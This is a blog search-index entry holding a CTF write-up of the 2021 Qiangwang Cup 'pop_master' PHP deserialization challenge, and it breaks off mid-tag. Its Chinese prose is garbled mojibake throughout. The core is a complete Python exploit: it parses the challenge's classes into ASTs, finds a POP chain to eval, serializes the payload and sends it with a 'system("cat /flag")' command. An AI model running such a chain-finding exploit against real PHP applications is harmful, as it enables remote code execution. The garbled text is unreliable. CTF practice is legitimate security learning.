<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>21å¹´å¼ºç½‘æ¯pop_master</title>
    <link href="/2023/12/14/21%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AFpop-master/"/>
    <url>/2023/12/14/21%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AFpop-master/</url>
    
    <content type="html"><![CDATA[<h3 id="21å¹´å¼ºç½‘æ¯-pop-master"><a href="#21å¹´å¼ºç½‘æ¯-pop-master" class="headerlink" title="21å¹´å¼ºç½‘æ¯ pop_master"></a>21å¹´å¼ºç½‘æ¯ pop_master</h3><p>è¿™é“é¢˜èŠ±äº†æˆ‘ä¸‰å››å¤©çš„æ—¶é—´(å½“ç„¶ä¸»è¦æ˜¯å¿™é‡ŒæŠ½é—²)æ‰å‹‰å¼ºç®—å¾—ä¸Šç†è§£ï¼Œä½œè€…ä¸»è¦æƒ³æä¾›ä¸€ä¸ªæ€è·¯ï¼šé€šè¿‡æŠ½è±¡è¯­æ³•æ ‘æ¥è¿›è¡Œè‡ªåŠ¨åŒ–ä»£ç å®¡è®¡ï¼Œç„¶è€Œæ®è¯´å½“æ—¶çš„é¢˜è§£äº”èŠ±å…«é—¨ï¼ŒåŸºæœ¬æ²¡æœ‰æŒ‰ä½œè€…é¢„æœŸçš„é¢˜è§£ï¼Œè¿™ä¹Ÿå¯¼è‡´ç›¸å…³çš„æ–‡ç« æ¯”è¾ƒéš¾æ‰¾ã€‚ã€‚ã€‚</p><h4 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h4><p>ç½‘ç«™ç›´æ¥ç»™å‡ºæºç ï¼Œä¸€çœ¼popé“¾(å½“ç„¶é¢˜ç›®ä¹Ÿå‘Šè¯‰äº†)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;class.php&quot;</span>;<br><span class="hljs-comment">//class.php.txt</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>];<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;argv&#x27;</span>];<br><span class="hljs-variable">$class</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$class</span>-&gt;<span class="hljs-title function_ invoke__">w78yAw</span>(<span class="hljs-variable">$b</span>);<br></code></pre></td></tr></table></figure><p>ç»“æ„å¾ˆç®€å•ï¼Œè§£é¢˜æ€è·¯ä¹Ÿå¾ˆæ¸…æ™°ï¼Œæ‰¾åˆ°ä¸€æ¡è°ƒç”¨é“¾å®ç°ä»»æ„ä»£ç æ‰§è¡Œå³å¯ï¼Œbbbbbbbbutï¼</p><p>æŒ‰ç…§æ³¨é‡Šä¸‹è½½æºç åï¼Œå¥½å®¶ä¼™ï¼Œ17ä¸‡è¡Œä»£ç ï¼Œä¸€ä¸‡ä¸ªç±»ã€‚ã€‚ã€‚</p><p>å¾ˆæ˜¾ç„¶è‚‰çœ¼å®¡è®¡ä¸å¤ªç°å®ï¼Œåªèƒ½æ“ä¸ªè„šæœ¬è¾…åŠ©æ‰¾åˆ°ä¸€æ¡å¯ç”¨é“¾ï¼Œç„¶åæˆ‘å°±å»æœäº†ä½œè€…çš„å®˜æ–¹é¢˜è§£</p><p>[å¼ºç½‘æ¯<a href="https://www.anquanke.com/post/id/244153">pop_master]ä¸[é™€é‚£å¤š]èµ›é¢˜çš„å‡ºé¢˜è®°å½•</a> </p><p>å˜¿ï¼Œæ‚¨çŒœæ€ä¹ˆç€ï¼Ÿä½œè€…ç›´æ¥æŠŠè‡ªå·±çš„ä¸€ä¸ªé¡¹ç›®æ”¹è¿‡æ¥å½“è§£é¢˜è„šæœ¬äº†ï¼Œè¿™ä¹Ÿå°±ç®—äº†ï¼Œå…³é”®è¿™è„šæœ¬â€¦åŠ èµ·æ¥æœ‰ä¸€åƒå¤šè¡Œï¼Œå°±ä¸¤å¤©æ—¶é—´æ‰“ä¸ªæ¯”èµ›ï¼Œè¿˜è¦æˆ‘ç”¨ä¸ç†Ÿç»ƒçš„phpæ‰‹æ“ä¸€ä¸ªåƒè¡Œè„šæœ¬å—ï¼Ÿï¼Ÿï¼Ÿ  </p><p>çœ‹çš„å¿ƒç´¯ï¼Œæ— å¥ˆï¼Œå¼€å§‹æ±‚æ´ï¼Œåœ¨ç»„å†…å‘äº†è‡ªå·±çš„é—®é¢˜å’Œæ±‚åŠ©</p><p><img src="/2023/12/14/21%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AFpop-master/image-20231214193835886.png" alt="image-20231214193835886"></p><p>å¾ˆå¥½ï¼Œå¾—åˆ°äº†è€å­¦é•¿çš„å¸®åŠ©ï¼Œè€å­¦é•¿è¯´è‡ªå·±åšè¿‡è¿™é“é¢˜ï¼Œç„¶åç”©äº†ä¸ªé“¾æ¥ <a href="https://blog.frankli.site/2021/06/15/Misc/libphpserialize/">https://blog.frankli.site/2021/06/15/Misc/libphpserialize/</a></p><p>æˆ‘ä¸€çœ‹ï¼Œéœï¼Œä¸€ç™¾è¡Œï¼Œè¿˜æ˜¯pyå†™çš„ï¼Œæˆ‘å¯å¤ªå¼€å¿ƒäº†ï¼Œè€å­¦é•¿ä¸æ„§æ˜¯è€å­¦é•¿ï¼Œç›´æ¥ç»™æˆ‘çœäº†ä¸€å¤§å †éº»çƒ¦ï¼Œç„¶åå¼€å§‹å•ƒå­¦é•¿çš„expã€‚ã€‚ã€‚</p><p>æ²¡ï¼æœ‰ï¼æ³¨ï¼é‡Šï¼</p><p>ä¼°è®¡æ˜¯æ‰“æ¯”èµ›æˆ–è€…ä¸´æ—¶åšé¢˜æ“çš„è„šæœ¬ï¼Œæˆ–è€…æ˜¯è§‰å¾—å¤ªç®€å•æ‡’å¾—å†™æ³¨é‡Šï¼Œæ€»ä¹‹æˆ‘è¦ç”Ÿå•ƒäº†è¿˜å¥½å­¦é•¿çš„ä»£ç æ ¼å¼éå¸¸è§„èŒƒï¼Œå‡½æ•°å‘½åä¹Ÿéƒ½æ˜¯ç›¸å…³åè¯æˆ–è€…ç¼©å†™ï¼Œç®€å•çš„è®©gpt4å¸®æˆ‘æ¢³ç†äº†ä¸‹é€»è¾‘å°±å·®ä¸å¤šç†è§£äº†ï¼Œåªèƒ½è¯´å¾ˆå¼ºï¼Œæ”¾ä¸ªå­¦é•¿çš„expè†œæ‹œä¸€ä¸‹</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> phpserialize <span class="hljs-keyword">import</span> serialize<br><span class="hljs-keyword">from</span> requests <span class="hljs-keyword">import</span> session<br><br><span class="hljs-keyword">from</span> phply <span class="hljs-keyword">import</span> phplex<br><span class="hljs-keyword">from</span> phply.phpast <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> phply.phpparse <span class="hljs-keyword">import</span> make_parser<br><br>ses = session()<br>classes = &#123;&#125;<br>func2class = &#123;&#125;<br>parser = make_parser()<br>good_paths = []<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;class.php&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    lexer = phplex.lexer.clone()<br>    ast = parser.parse(file.read(), lexer=lexer)<br>    <span class="hljs-keyword">for</span> cls <span class="hljs-keyword">in</span> ast:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> cls.nodes:<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(i) <span class="hljs-keyword">is</span> Method:<br>                func2class[i.name] = cls.name<br>        classes[cls.name] = cls<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_good_assign</span>(<span class="hljs-params">ctx_param, node: Assignment</span>):<br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">type</span>(node) == Assignment<br>    <span class="hljs-keyword">if</span> ctx_param.name == node.node.name:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(node.expr) == BinaryOp:<br>            <span class="hljs-keyword">if</span> node.expr.op == <span class="hljs-string">&#x27;.&#x27;</span>:<br>                <span class="hljs-keyword">if</span> node.expr.left.name == ctx_param.name:<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(node)<br>                <span class="hljs-comment"># unexpected</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span>(node.expr) == Variable:<br>            <span class="hljs-keyword">if</span> node.expr.name == ctx_param.name:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_if</span>(<span class="hljs-params">ctx_param, node: If</span>):<br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">type</span>(node) == If<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(node.expr) <span class="hljs-keyword">is</span> BinaryOp:<br>        <span class="hljs-comment"># debug</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">eval</span>(<span class="hljs-built_in">str</span>(node.expr.left)+node.expr.op+<span class="hljs-built_in">str</span>(node.expr.right)):<br>            <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> node.node.nodes:<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(n) <span class="hljs-keyword">is</span> Assignment <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> is_good_assign(ctx_param, n):<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span>(node.expr) <span class="hljs-keyword">is</span> FunctionCall:<br>        <span class="hljs-keyword">if</span> node.expr.name == <span class="hljs-string">&#x27;method_exists&#x27;</span>:<br>            func = node.expr.params[<span class="hljs-number">1</span>].node<br>            <span class="hljs-keyword">assert</span>(<span class="hljs-built_in">type</span>(func) == <span class="hljs-built_in">str</span>)<br>            search(classes[func2class[func]],<br>                   node.expr.params[<span class="hljs-number">0</span>].node.name, func)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;unexpected call&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;unexpected expr&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_method</span>(<span class="hljs-params">ctx, method</span>):<br>    ctx.param = method.params[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> method.nodes:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(i) <span class="hljs-keyword">is</span> For:<br>            <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> i.node.nodes:<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(n) <span class="hljs-keyword">is</span> Assignment <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> is_good_assign(method.params[<span class="hljs-number">0</span>], n):<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span>(i) <span class="hljs-keyword">is</span> If:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> handle_if(method.params[<span class="hljs-number">0</span>], i):<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span>(i) <span class="hljs-keyword">is</span> MethodCall:<br>            search(classes[func2class[i.name]], i.node.name, i.name)<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span>(i) <span class="hljs-keyword">is</span> Assignment:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> is_good_assign(method.params[<span class="hljs-number">0</span>], i):<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span>(i) <span class="hljs-keyword">is</span> Eval:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">search</span>(<span class="hljs-params">node, attr, method, path=[]</span>):<br>    path.append((node, attr, method))<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> node.nodes:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(i) <span class="hljs-keyword">is</span> Method <span class="hljs-keyword">and</span> i.name == method:<br>            ctx = <span class="hljs-built_in">type</span>(<span class="hljs-string">&#x27;&#x27;</span>, (<span class="hljs-built_in">object</span>,), &#123;&#125;)()<br>            <span class="hljs-keyword">if</span> handle_method(ctx, i):<br>                good_paths.append(<span class="hljs-built_in">list</span>(path))<br>    path.pop()<br><br><br>good_paths = []<br>search(classes[<span class="hljs-string">&#x27;dLEWX3&#x27;</span>], <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;L8IHXt&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(good_paths))<br><span class="hljs-keyword">for</span> n, a, m <span class="hljs-keyword">in</span> good_paths[<span class="hljs-number">0</span>]:<br>    <span class="hljs-built_in">print</span>(n.name, a, m)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">prop_call</span>(<span class="hljs-params">parent, attr, cls</span>):<br>    <span class="hljs-built_in">setattr</span>(parent, attr, <span class="hljs-built_in">type</span>(cls, (<span class="hljs-built_in">object</span>,), &#123;&#125;)())<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(parent, attr)<br><br><br>root = <span class="hljs-built_in">type</span>(<span class="hljs-string">&#x27;dLEWX3&#x27;</span>, (<span class="hljs-built_in">object</span>,), &#123;&#125;)()<br>node = root<br>path = good_paths[<span class="hljs-number">0</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(path)):<br>    node = prop_call(node, path[i][<span class="hljs-number">1</span>], path[i][<span class="hljs-number">0</span>].name)<br><span class="hljs-built_in">print</span>(serialize(root))<br><br><span class="hljs-built_in">print</span>(ses.get(<span class="hljs-string">&#x27;http://my_instance.cloudeci1.ichunqiu.com/&#x27;</span>, params=&#123;<br>    <span class="hljs-string">&#x27;pop&#x27;</span>: serialize(root),<br>    <span class="hljs-string">&#x27;argv&#x27;</span>: <span class="hljs-string">&#x27;system(&quot;cat /flag&quot;); //&#x27;</span>,<br>&#125;).text)<br></code></pre></td></tr></table></figure><p> å­¦é•¿ç”¨äº†pythonçš„ <code>libphpserialize</code> åº“ï¼Œæ•´ä½“æ€æƒ³å’Œä½œè€…å·®ä¸å¤šï¼Œå…ˆå°†ä¸€ä¸‡ä¸ªç±»è½¬ä¸ºæŠ½è±¡ä»£ç æ ‘ï¼Œç„¶åéå†èŠ‚ç‚¹åˆ†åˆ«åˆ¤æ–­ <strong>å˜é‡èµ‹å€¼ï¼Œifè¯­å¥ï¼Œforè¯­å¥</strong> æ˜¯å¦ä¼šå¯¹é“¾çš„ä¼ å¯¼äº§ç”Ÿå½±å“ï¼Œä¹Ÿå°±æ˜¯èƒ½å¦ â€˜<strong>æ¶ˆæ¯’</strong>â€˜ï¼Œç„¶åé€šè¿‡ç±»ä¼¼å‹æ ˆå‡ºæ ˆçš„æ–¹å¼æ¥ä¾æ¬¡éå†å¯è¡Œè·¯çº¿ï¼Œæœ€ç»ˆå¾—åˆ°å®Œæ•´é“¾è·¯ï¼Œå¹¶ä¸”ï¼è¿˜åšäº†è‡ªåŠ¨åŒ–ç”Ÿæˆphpåºåˆ—åŒ–payloadå’Œè‡ªåŠ¨æäº¤ï¼Œå¯ä»¥è¯´è€ƒè™‘çš„åŠå…¶å…¨é¢äº†ï¼Œæ¥ä¸‹æ¥æˆ‘æ–—èƒ†å°è¯•å¯¹å­¦é•¿çš„ä»£ç è¿›è¡Œä¸€æ³¢åˆ†æå’Œå­¦ä¹ ï¼Œå¹¶å¯¹æ¶‰åŠçš„æ¦‚å¿µåšä¸ªæ¢³ç†ã€‚ </p><h4 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h4><p>é¦–å…ˆæ˜¯ç›¸å…³æ¦‚å¿µ</p><h5 id="æŠ½è±¡è¯­æ³•æ ‘-AST"><a href="#æŠ½è±¡è¯­æ³•æ ‘-AST" class="headerlink" title="æŠ½è±¡è¯­æ³•æ ‘(AST)"></a>æŠ½è±¡è¯­æ³•æ ‘(AST)</h5><p>æŠ½è±¡è¯­æ³•æ ‘ï¼ˆabstract syntax treeï¼ŒASTï¼‰ æ˜¯æºä»£ç çš„æŠ½è±¡è¯­æ³•ç»“æ„çš„æ ‘çŠ¶è¡¨ç¤ºï¼Œæ ‘ä¸Šçš„æ¯ä¸ªèŠ‚ç‚¹éƒ½è¡¨ç¤ºæºä»£ç ä¸­çš„ä¸€ç§ç»“æ„ï¼Œè¿™æ‰€ä»¥è¯´æ˜¯æŠ½è±¡çš„ï¼Œæ˜¯å› ä¸ºæŠ½è±¡è¯­æ³•æ ‘å¹¶ä¸ä¼šè¡¨ç¤ºå‡ºçœŸå®è¯­æ³•å‡ºç°çš„æ¯ä¸€ä¸ªç»†èŠ‚ï¼Œæ¯”å¦‚è¯´ï¼ŒåµŒå¥—æ‹¬å·è¢«éšå«åœ¨æ ‘çš„ç»“æ„ä¸­ï¼Œå¹¶æ²¡æœ‰ä»¥èŠ‚ç‚¹çš„å½¢å¼å‘ˆç°ã€‚ æŠ½è±¡è¯­æ³•æ ‘å¹¶ä¸ä¾èµ–äºæºè¯­è¨€çš„è¯­æ³•ï¼Œä¹Ÿå°±æ˜¯è¯´è¯­æ³•åˆ†æé˜¶æ®µæ‰€é‡‡ç”¨çš„ä¸Šä¸‹æ–‡æ— æ–‡æ–‡æ³•ï¼Œå› ä¸ºåœ¨å†™æ–‡æ³•æ—¶ï¼Œç»å¸¸ä¼šå¯¹æ–‡æ³•è¿›è¡Œç­‰ä»·çš„è½¬æ¢ï¼ˆæ¶ˆé™¤å·¦é€’å½’ï¼Œå›æº¯ï¼ŒäºŒä¹‰æ€§ç­‰ï¼‰ï¼Œè¿™æ ·ä¼šç»™æ–‡æ³•åˆ†æå¼•å…¥ä¸€äº›å¤šä½™çš„æˆåˆ†ï¼Œå¯¹åç»­é˜¶æ®µé€ æˆä¸åˆ©å½±å“ï¼Œç”šè‡³ä¼šä½¿åˆä¸ªé˜¶æ®µå˜å¾—æ··ä¹±ã€‚å› äº›ï¼Œå¾ˆå¤šç¼–è¯‘å™¨ç»å¸¸è¦ç‹¬ç«‹åœ°æ„é€ è¯­æ³•åˆ†ææ ‘ï¼Œä¸ºå‰ç«¯ï¼Œåç«¯å»ºç«‹ä¸€ä¸ªæ¸…æ™°çš„æ¥å£ã€‚ æŠ½è±¡è¯­æ³•æ ‘åœ¨å¾ˆå¤šé¢†åŸŸæœ‰å¹¿æ³›çš„åº”ç”¨ï¼Œæ¯”å¦‚æµè§ˆå™¨ï¼Œæ™ºèƒ½ç¼–è¾‘å™¨ï¼Œç¼–è¯‘å™¨ã€‚</p><p>ç®€å•æ¥è¯´ï¼ŒæŠŠä¸€æ®µä»£ç å˜æˆæ ‘çŠ¶ç»“æ„ï¼Œç±»ä¼¼äº 1+2*3 å˜æˆè¿™ä¸ªæ ·å­</p><img src="/2023/12/14/21%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AFpop-master/image-20231214200730966.png" alt="image-20231214200730966" style="zoom:50%;"><h5 id="phply"><a href="#phply" class="headerlink" title="phply"></a>phply</h5><p>phplyæ˜¯ä¸€ä¸ªè¿è¡Œåœ¨pythonä¸Šçš„phpæºçš„è¯æ³•åˆ†æå™¨å’Œè§£æå™¨ï¼Œå¯ä»¥æŠŠphpä»£ç è§£ææˆç±»ä¼¼ä¸Šå›¾é‚£æ ·çš„ç»“æ„ï¼Œå¹¶æŒ‰ç…§ä¸€å®šçš„è¯­æ³•è¿›è¡ŒæŸ¥æ‰¾å’Œåˆ†æã€‚æ¥æ®µç®€å•çš„ç¤ºä¾‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> phply <span class="hljs-keyword">import</span> phplex<br><span class="hljs-keyword">from</span> phply.phpparse <span class="hljs-keyword">import</span> make_parser<br><br>php_code=<span class="hljs-string">&quot;&quot;&quot;&lt;?php</span><br><span class="hljs-string">$a=1+2*3;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>lexer = phplex.lexer.clone()<br>parser = make_parser()<br>ast = parser.parse(php_code, lexer=lexer)<br><span class="hljs-built_in">print</span>(ast)<br><br><span class="hljs-comment"># è¾“å‡ºç»“æœ</span><br><span class="hljs-comment"># [Assignment(Variable(&#x27;$a&#x27;), BinaryOp(&#x27;+&#x27;, 1, BinaryOp(&#x27;*&#x27;, 2, 3)), False)]</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œ<code>variable</code>å˜é‡1,2,3 ç»è¿‡ <code>binaryOp</code>äºŒå…ƒæ“ä½œç¬¦ <code>*</code> å’Œ <code>+</code> å¤„ç†å ï¼Œ<code>assignment</code> èµ‹å€¼ç»™ <code>variable</code> å˜é‡ <code>$a</code> ã€‚</p><p>å†æ¥ä¸ªç¨å¾®å¤æ‚çš„è¯­å¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">php_code=<span class="hljs-string">&quot;&quot;&quot;&lt;?php</span><br><span class="hljs-string">if(2&gt;1)&#123;</span><br><span class="hljs-string">$a=1+2*3;</span><br><span class="hljs-string">$b=23;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-comment"># [If(BinaryOp(&#x27;&gt;&#x27;, 2, 1), Block([Assignment(Variable(&#x27;$a&#x27;), BinaryOp(&#x27;+&#x27;, 1, BinaryOp(&#x27;*&#x27;, 2, 3)), False), Assignment(Variable(&#x27;$b&#x27;), 23, False)]), [], None)]</span><br></code></pre></td></tr></table></figure><p>æ¯ä¸ª <code>[]</code> åˆ†éš”å¼€ä¸€ä¸ªä»£ç å—ï¼Œfor ä¹Ÿå·®ä¸å¤š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">php_code=<span class="hljs-string">&quot;&quot;&quot;&lt;?php</span><br><span class="hljs-string">for($i = 0; $i &lt; 13; $i ++)&#123;</span><br><span class="hljs-string">$a=1+2*3;</span><br><span class="hljs-string">$b=23;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-comment"># [For([Assignment(Variable(&#x27;$i&#x27;), 0, False)], [BinaryOp(&#x27;&lt;&#x27;, Variable(&#x27;$i&#x27;), 13)], [PostIncDecOp(&#x27;++&#x27;, Variable(&#x27;$i&#x27;))], Block([Assignment(Variable(&#x27;$a&#x27;), BinaryOp(&#x27;+&#x27;, 1, BinaryOp(&#x27;*&#x27;, 2, 3)), False), Assignment(Variable(&#x27;$b&#x27;), 23, False)]))]</span><br></code></pre></td></tr></table></figure><h5 id="ä»£ç è§£æ"><a href="#ä»£ç è§£æ" class="headerlink" title="ä»£ç è§£æ"></a>ä»£ç è§£æ</h5><p>å¥½äº†ï¼Œå‰©ä¸‹çš„é€šè¿‡ä»£ç æ¥å­¦ä¹ å§</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;class.php&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    lexer = phplex.lexer.clone()<br>    ast = parser.parse(file.read(), lexer=lexer)<br>    <span class="hljs-keyword">for</span> cls <span class="hljs-keyword">in</span> ast:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> cls.nodes:<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(i) <span class="hljs-keyword">is</span> Method:<br>                func2class[i.name] = cls.name<br>        classes[cls.name] = cls<br></code></pre></td></tr></table></figure><p>å›ºå®šæ ¼å¼æ²¡å•¥è¯´çš„ï¼Œè¿™ä¸€æ­¥çš„é¢„å¤„ç†æ˜¯å°†æ‰€æœ‰çš„ <code>ç±»</code> å’Œ <code>å‡½æ•°</code> å•ç‹¬æŠ½å‡ºæ¥ï¼Œåˆ†åˆ«ä½œäº† <code>ç±»å=&gt;ç±»èŠ‚ç‚¹</code> å’Œ <code>å‡½æ•°å=&gt;ç±»å</code> çš„å­—å…¸</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span 